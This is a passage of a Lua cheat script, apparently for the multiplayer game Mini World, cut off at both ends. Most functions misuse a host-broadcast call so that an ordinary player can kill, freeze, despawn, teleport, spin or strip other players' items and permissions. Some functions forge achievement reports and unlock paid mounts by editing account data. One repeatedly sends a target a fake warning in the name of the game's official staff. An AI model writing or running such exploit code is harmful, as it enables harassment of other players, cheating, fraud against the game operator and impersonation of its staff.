    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("请输入有效宠物ID")
            return
        end
        CurMainPlayer:summonPet(1000, AccountManager:getUin() .. "_0", value, 5, 3, '#b#R斐济杯')
    end)
end

function qhdw()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("请输入有效队伍ID（数字）")
            return
        end
        local tdata = {
            [1] = "team",
            [2] = "changePlayerTeam",
            [3] = { AccountManager:getUin(), value }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end)
end
      
function zdpf()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("请输入有效皮肤数字")
            return
        end
        local skinId = "skin_" .. value
        local tdata = {
            [1] = "actor",
            [2] = "changeCustomModel",
            [3] = { AccountManager:getUin(), skinId }
        }
        pcall(function()
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end)
    end, "输入皮肤数字（例如 1 代表 skin_1）")
end
        
        
function jqms()
    -- 观战目标设置功能（左边停止并恢复，右边开启并设置观战目标）
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
GetInst("MessageBoxInterface"):dualBtnBox(
    "左边关闭\n右边开启\n退出房间之前一定要关闭",  -- 消息内容
    "关闭",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止并恢复
            -- ===== 停止观战循环 =====
            _G.spectate_loop_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000循环已停止")
            
            -- 恢复自己的迷你号
            if CurMainPlayer then
                local myUin = AccountManager:getUin()
                CurMainPlayer:setUin(myUin)
                ShowGameTipsWithoutFilter("已关闭")
            end
            -- =========================
            
        elseif btnType == 1 then  -- 右边按钮：开启并设置
            -- ===== 开启观战循环 =====
            _G.spectate_loop_enabled = true
            ShowGameTipsWithoutFilter("#c00ffff已开启")
            
            -- 启动观战循环
            threadpool:work(function()
                while _G.spectate_loop_enabled do
                    -- 显示战斗准备界面
                    getglobal("BattlePrepareFrame"):Show()
                    getglobal("BattlePrepareFrameStartGame"):Show()
                    getglobal("BattlePrepareFrameTips"):SetText("局前模式")
                    
                    -- 设置观战目标为迷你号1000
                    CurMainPlayer:setUin(ClientCurGame:getHostUin())
                    
                    -- 等待0.1秒
                    threadpool:wait(0.1)
                end
            end)
            -- =========================
        end
    end
)
end


-- ==================== 简单功能函数 ====================



function jzgj()
    local tdata = {
        [1] = "gamerule",
        [2] = "setAttackPlayerMode",
        [3] = { 1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function pctv7()
    local tdata = {
        [1] = "gamerule",
        [2] = "setAttackPlayerMode",
        [3] = { 0 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end


-- Đổi tên người chơi (Nhập chữ trước, chọn người sau)
function pctv9()
    -- Bước 1: Mở bảng nhập chữ trước để bạn gõ tên mới
    ShowTextInputSafe(function(text)
        if not text or text == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập biệt danh hợp lệ.")
            return
        end
        
        -- Bước 2: Sau khi nhập xong chữ, mở bảng chọn người chơi để áp dụng tên vừa gõ
        ShowPlayerList(function(uin)
            if not uin then return end
            
            -- Kiểm tra danh sách VIP (nếu có dùng chung biến whitelist)
            if whitelist and whitelist[uin] then
                ShowGameTipsWithoutFilter("#RTính năng này bị vô hiệu hóa đối với thành viên VIP.", 3)
                return
            end
            
            -- Lấy tên cũ của người chơi đó để hiển thị thông báo
            local oldName = "Không rõ tên"
            pcall(function()
                if ClientCurGame and ClientCurGame.getPlayerByUin then
                    local playerObj = ClientCurGame:getPlayerByUin(uin)
                    if playerObj and playerObj.getNickName then
                        oldName = playerObj:getNickName()
                    end
                end
            end)

            -- Gói tin đổi tên người chơi
            local tdata = {
                [1] = "actor",
                [2] = "setnickname",
                [3] = {
                    uin,  -- UID của người chơi được chọn sau khi bấm
                    text  -- Tên mới đã nhập từ bước đầu tiên
                }
            }
            
            pcall(function()
                if ScriptSupportTask and SSTASKID then
                    ScriptSupportTask:reportTaskToHost(
                        SSTASKID.HOST_BordCast,
                        tdata
                    )
                end
            end)
            
            -- Thông báo thành công
            ShowGameTipsWithoutFilter(string.format("#c00ffffĐã đổi tên cho %s thành: %s", tostring(oldName), tostring(text)))
        end, "选择要改名的玩家")
        
    end)
end

function dtzl()
    local tdata = {
        [1] = "gamerule",
        [2] = "setGravityFactor",
        [3] = { 0.1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function gbtq1()
    local tdata = {
        [1] = "gamerule",
        [2] = "setWeather",
        [3] = { 1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function gbtq2()
    local tdata = {
        [1] = "gamerule",
        [2] = "setWeather",
        [3] = { 3 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function gbtq3()
    local tdata = {
        [1] = "gamerule",
        [2] = "setWeather",
        [3] = { 5 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function gbtq4()
    local tdata = {
        [1] = "gamerule",
        [2] = "setWeather",
        [3] = { 6 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function wfgj()
    local tdata = {
        [1] = "player",
        [2] = "setActionAttrState",
        [3] = { AccountManager:getUin(), 64, false }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function qtxr()
    local num = ClientCurGame:getNumPlayerBriefInfo()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, y / 100, z / 100
    
    for i = 1, num do
        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
            local tdata = {
                [1] = "player",
                [2] = "setPosition",
                [3] = { briefInfo.uin, new_x, new_y, new_z }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end
end

function szfs()
    local tdata = {
        [1] = "player",
        [2] = "setAtt",
        [3] = { AccountManager:getUin(), 99999999, 22 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function czgw()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, y / 100, z / 100
    local tdata = {
        [1] = "world",
        [2] = "spawnMob",
        [3] = { new_x, new_y, new_z, 3517, 1, true }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function phfk()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local gridX, gridY, gridZ = x / 100, y / 100, z / 100
    
    local startPos = { x = gridX - 25, y = gridY - 50, z = gridZ - 25 }
    local endPos = { x = gridX + 24, y = gridY + 49, z = gridZ + 24 }
    
    local tdata = {
        [1] = "area",
        [2] = "clearAllBlockAreaRange",
        [3] = { startPos, endPos, 0 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function wjsb()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "setGameResults",
            [3] = { uin, 2 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "玩家失败")
end

function wjtx()
    ShowPlayerList(function(uin)
        for i = 1, #effectNameList do
            local tdata = {
                [1] = "actor",
                [2] = "playBodyEffectByFile",
                [3] = { uin, effectNameList[i], true }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "玩家特效")
end

function jbwj()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RTính năng này bị vô hiệu hóa đối với thành viên VIP", 3)
        else
            ShowGameTips("#RTính năng này bị vô hiệu hóa đối với thành viên VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "actor",
            [2] = "playerHurt",
            [3] = { AccountManager:getUin(), uin, 1.8e+308, 0 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "玩家死亡")
end

function kjzq()
-- 解锁坐骑（使用提供的坐骑ID列表）
-- 获取玩家账户数据
local accountData = AccountManager:getAccountData().Account

-- 获取BillDataSvr
local BillDataSvr = accountData.BillDataSvr

-- 坐骑ID列表
local horseIds = {
    3437,3496,4532,4587,4566,4624,4502,3459,4520,4561,3440,4595,3245
}

-- 设置解锁坐骑数量
BillDataSvr.UnlockRiderInfoNum = #horseIds

-- 创建新的解锁坐骑信息表
local newRiderInfo = {}

-- 遍历坐骑ID列表，为每个ID创建坐骑信息
for i, horseId in ipairs(horseIds) do
    newRiderInfo[i] = {
        RiderID = horseId,    -- 使用列表中的坐骑ID
        RiderLevel = 1,       -- 坐骑等级设为1
        -- 如果有其他必要字段，可以在这里添加
    }
end

-- 替换原有的坐骑信息
BillDataSvr.UnlockRiderInfo = newRiderInfo

-- 也可以修改leveldb中的数据（如果需要）
if accountData.leveldb then
    local leveldbRiderInfo = {}
    for _, horseId in ipairs(horseIds) do
        table.insert(leveldbRiderInfo, {
            RiderID = horseId,
            RiderLevel = 1,
        })
    end
    accountData.leveldb.UnlockRiderInfo = leveldbRiderInfo
end


end


function bfyx()

-- 获取玩家当前位置
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local new_x = x / 100
local new_y = y / 100
local new_z = z / 100

CurWorld:playSoundAndParticleEffect(new_x, new_y, new_z, 'pvp.kill_6', 100, 50, 0, new_x, new_y, new_z, 0, 1, 100)
end

function sqxz()
Rxz = {1001, 1002, 1003, 1004, 1005, 1006, 1008, 1010, 1011, 1012, 1014, 1015, 1017, 1018, 1019, 1020}

    for dm = 1, 22 do
        local index = dm + 1  
        if Rxz[index] then
            ArchievementGetInstance().func:Report2Server(Rxz[index], {pos = 838384, add = 2001, count = 2001})
        end
    end   
    end
    
    
    function tjsw()
for a=0,100000 do 
    threadpool:wait(1)
-- 获取玩家当前位置
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local center_x = x / 100
local center_y = y / 100
local center_z = z / 100

-- 椭圆参数（距离8-10格，空心更大）
local a = 6.0  -- X轴半径（左右方向）8格
local b = 4.0  -- Z轴半径（前后方向）6格
local points = 7  -- 特效数量，距离远了需要更多特效

-- 只在椭圆边缘播放特效（空心）
for i = 0, points - 1 do
    local angle = (i / points) * math.pi * 2
    
    -- 计算椭圆边缘上的坐标
    local offset_x = math.cos(angle) * a
    local offset_z = math.sin(angle) * b
    
    -- 计算最终位置（只在椭圆边缘）
    local new_x = center_x + offset_x
    local new_y = center_y
    local new_z = center_z + offset_z
    
    -- 播放闪电特效
    CurWorld:playSoundAndParticleEffect(
        new_x, new_y, new_z, 0, 0, 0, 0, 
        new_x, new_y, new_z, 
        'particles/aotu_06_leishenzhichui.ent', 1, 20
    )
end

print("已在你周围8x6格处生成空心椭圆形闪电圈")
end
end

function qcbf()
for a=0,100000 do 
    threadpool:wait(0.1)
tdata = {}
    tdata[1] = "buff";
    tdata[2] = "clearAllBuff";
    tdata[3] = {AccountManager:getUin()}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end
end


function bcfhd()
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local base_x = x / 100
local base_y = y / 100
local base_z = z / 100
for dx = -1, 1 do

ShowPlayerList(function(uin)
if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        tdata = {}
    tdata[1] = "player";
    tdata[2] = "setRevivePoint";
    tdata[3] = {uin,base_x,base_y,base_z}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "指定玩家复活点")
    end
    end

function fhxk()
    ShowGameTipsWithoutFilter("复活虚空功能")
end

function jzyd()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        local tdata = {
            [1] = "actor",
            [2] = "setActionAttrState",
            [3] = { uin, PLAYERATTR.ENABLE_MOVE, false }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "禁止移动")
end

function gbqx()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        local flags = { 2, 4, 8, 16, 256, 2048 }
        for _, flag in ipairs(flags) do
            local tdata = {
                [1] = "player",
                [2] = "setActionAttrState",
                [3] = { uin, flag, false }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "关闭权限")
end

function wjxz()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "rotateCamera",
            [3] = { uin, -999994890, -9999999 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "玩家旋转")
end

function tjbf()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        local tdata = {
            [1] = "buff",
            [2] = "addBuff",
            [3] = { uin, 46, 1, 0 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "禁锢玩家")
end

function qcwj()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        local tdata = {
            [1] = "world",
            [2] = "despawnActor",
            [3] = { uin }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "清除玩家")
end

function jgwj()
    ShowPlayerList(function(uin)
        for a = 0, 10000 do
            threadpool:wait(0.1)
            local tdata = {
                [1] = "player",
                [2] = "notifyGameInfo2Self",
                [3] = { uin, "#R我是迷你官方，发现你有违规，警告一次，第二次直接制裁" }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "警告玩家")
end



function ddjt()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "shakeCamera",
            [3] = { uin, 10000, 1000 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "抖动镜头")
end

function fjhmd()
    ShowPlayerList(function(uin)
        for a = 0, 100000 do
            threadpool:wait(0.1)
            if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
            local tdata = {
                [1] = "world",
                [2] = "despawnActor",
                [3] = { uin }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "拉入黑名单")
end

function zdzl()
    ShowPlayerList(function(uin)
        for a = 0, 100000 do
            threadpool:wait(0.1)
            if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
            local tdata = {
                [1] = "player",
                [2] = "playAct",
                [3] = { uin, 9 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "玩家爬下")
end

function qkwjbb()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        local tdata = {
            [1] = "backpack",
            [2] = "clearAllPack",
            [3] = { uin }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "清空玩家背包")
end


    function qcwp2()
    for a = 0, 100000 do
            threadpool:wait(0.1)
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local new_x, new_y, new_z = x / 100, y / 100, z / 100

-- 计算范围：从主体位置到周围1000格（游戏内单位）
local range = 1000
local tdata = {
    [1] = "world",
    [2] = "despawnItemByBox",
    [3] = {
        new_x - range, new_y - range, new_z - range,  -- 最小点
        new_x + range, new_y + range, new_z + range   -- 最大点
    }
}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end
end

function zdcsrl()
    ShowPlayerList(function(uin)
        local uin_ = uin
        -- 这里可以添加权限判断
        -- AccountManager.cluster.buddysvr.route('gm.kick', uin_);
    end, "单体传送")
end

-- ==================== 复杂功能函数 ====================
function fsjg()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 炸图模拟器功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "左边停止激光\n右边开启激光",  -- 消息内容
    "关闭",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            _G.ztmn_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000激光已停止")
            
        elseif btnType == 1 then  -- 右边按钮：开启
            _G.ztmn_enabled = true
            ShowGameTipsWithoutFilter("#c00ffff激光已开启 - 四面八方")
            
            -- 启动炸图循环
            threadpool:work(function()
                while _G.ztmn_enabled do
                    -- 获取自己当前位置
                    local my_x, my_y, my_z = CurMainPlayer:getPosition(0, 0, 0)
                    local center_x = my_x / 100
                    local center_y = my_y / 100
                    local center_z = my_z / 100
                    
                    -- 向四面八方发射（8个方向）
                    for angle = 0, 315, 45 do  -- 0°, 45°, 90°, 135°, 180°, 225°, 270°, 315°
                        local rad = math.rad(angle)  -- 角度转弧度
                        
                        -- 计算目标位置（距离50-100格）
                        local distance = math.random(50, 100)
                        local target_x = center_x + math.cos(rad) * distance
                        local target_z = center_z + math.sin(rad) * distance
                        local target_y = center_y
                        
                        -- 发射投掷物（从自己位置射向目标）
                        local tdata = {
                            [1] = "world",
                            [2] = "spawnProjectile",
                            [3] = {
                                AccountManager:getUin(),
                                15509,  -- 火龙果ID
                                center_x, center_y + 2, center_z,  -- 发射位置（自己位置稍微抬高）
                                target_x, target_y, target_z,       -- 目标位置
                                500
                            }
                        }
                        
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                        end)
                    end
                    
                    threadpool:wait(0.2)  -- 0.2秒发射一轮
                end
            end)
        end
    end
)
end


function bf1()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/096d816716f4f311fd3a78d9f2dfd3fc.mp3", 0)
end

function bf2()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/08d4196d5ad306c7505159a4113ad549.mp3", 0)
end

function bf3()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/1c77ceb3251448c5c1f656939f9e490b.mp3", 0)
end

function bf4()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/9917f2147a24fff85a81ff5ef7428f13.mp3", 0)
end

function bf5()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/47c70e475c8d9ef84999596ad6b6e33c.mp3", 0)
end

function bf6()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/8038415b8214f96d21b9c5fdbcae9fcc.mp3", 0)
end


function bf7()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/5c889ce89b6a26bbd4337c43782af86a.mp3", 0)
end


function bf8()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/e31825397524e0557521d76f9a167170.mp3", 0)
end

function bf9()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/50c7531b5b188a2acd31ae8b7da5efdf.mp3", 0)
end


function bf10()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/79042f40a3b2a2c8dae775669a859aff.mp3", 0)
end


function zxkz()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 控位+禁止移动功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "左边停止控位\n右边开启控位并选择目标",  -- 消息内容
    "关闭",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止控位 =====
            _G.control_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000控位已停止")
            
            -- ===== 恢复所有被控玩家的移动 =====
            threadpool:work(function()
                threadpool:wait(0.1)
                -- 这里需要记录被控的玩家UIN，简单起见先遍历所有玩家
                local uin_list = GetPlayerUinList()
                for _, uin in ipairs(uin_list) do
                    local moveTdata = {
                        [1] = "actor",
                        [2] = "setActionAttrState",
                        [3] = { uin, _G.PLAYERATTR.ENABLE_MOVE, true }  -- true = 恢复移动
                    }
                    pcall(function() 
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, moveTdata) 
                    end)
                end
                ShowGameTipsWithoutFilter("#c00ffff已恢复所有玩家移动")
            end)
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启控位 =====
            _G.control_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000请先进入游戏房间")
                _G.control_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list <= 1 then
                ShowGameTipsWithoutFilter("#cFF0000当前房间没有其他玩家")
                _G.control_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "选择控位目标",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("请选择要控位的玩家")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad玩家列表")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad点击开始控位")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ---=== 白名单检查开始 ===---
                if whitelist and whitelist[targetUin] then
                    ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
                    _G.control_enabled = false
                    return
                end
                ---=== 白名单检查结束 ===---
                
                -- ===== 禁止目标玩家移动 =====
                local moveTdata = {
                    [1] = "actor",
                    [2] = "setActionAttrState",
                    [3] = { targetUin, _G.PLAYERATTR.ENABLE_MOVE, false }  -- false = 禁止移动
                }
                pcall(function() 
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, moveTdata) 
                end)
                -- ============================
                
                ShowGameTipsWithoutFilter("#c00ffff已选择目标：" .. targetUin .. "，开始控位循环（准心指向哪里，他就去哪里，已禁止移动）")
                
                -- 启动控位循环
                threadpool:work(function()
                    local loopCount = 0
                    local myUin = AccountManager:getUin()
                    
                    while _G.control_enabled do
                        loopCount = loopCount + 1
                        
                        -- 获取自己的准心位置
                        InitGameAPI()
                        GameVmTriggerInit()
                        local ret, aimX, aimY, aimZ = GameVM.Player:getAimPos(myUin)
                        
                        if ret == ErrorCode.OK then
                            -- 将目标玩家传送到准心位置
                            local posTdata = {
                                [1] = "player",
                                [2] = "setPosition",
                                [3] = {targetUin, aimX, aimY, aimZ}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, posTdata) 
                            end)
                            
                            -- 每50次重新确认禁止移动（防止被恢复）
                            if loopCount % 50 == 0 then
                                local moveTdata = {
                                    [1] = "actor",
                                    [2] = "setActionAttrState",
                                    [3] = { targetUin, _G.PLAYERATTR.ENABLE_MOVE, false }
                                }
                                pcall(function() 
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, moveTdata) 
                                end)
                            end
                            
                            -- 每100次显示一次提示
                            if loopCount % 100 == 0 then
                                ShowGameTipsWithoutFilter("#cFFAA00控位中... 目标:" .. targetUin .. " 位置:" .. string.format("%.1f,%.1f,%.1f", aimX, aimY, aimZ))
                            end
                        else
                            if loopCount % 50 == 0 then
                                ShowGameTipsWithoutFilter("#cFF0000无法获取准心位置")
                            end
                        end
                        
                        -- 极速更新
                        threadpool:wait(0.01)  -- 每0.01秒更新一次
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000控位循环结束")
                end)
            end
            -- ====================
        end
    end
)
end
                    



function dtms()

ShowPlayerList(function(uin)
    
    for i=1000, 9000 do
grid_index=i
        tdata = {}
    tdata[1] = "backpack";
    tdata[2] = "discardItem";
    tdata[3] = {uin,grid_index,1}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end
    end, "玩家扔东西")
end


function kzyd()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 速度控制功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "左边停止速度控制\n右边开启速度控制并选择目标",  -- 消息内容
    "关闭",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止速度控制 =====
            _G.sd_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000速度控制已停止")
            
            -- 恢复所有玩家速度
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.sd_enabled then
                    local num = ClientCurGame:getNumPlayerBriefInfo()
                    for i = 1, num do
                        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                            local tdata = {}
                            tdata[1] = "actor"
                            tdata[2] = "appendSpeed"
                            tdata[3] = {briefInfo.uin, 0, 0, 0}  -- 0,0,0 = 停止移动
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                            end)
                        end
                    end
                    ShowGameTipsWithoutFilter("#c00ffff已恢复所有玩家速度")
                end
            end)
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启速度控制 =====
            _G.sd_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000请先进入游戏房间")
                _G.sd_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000当前房间没有其他玩家")
                _G.sd_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "选择速度控制目标",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("请选择要控制速度的玩家")
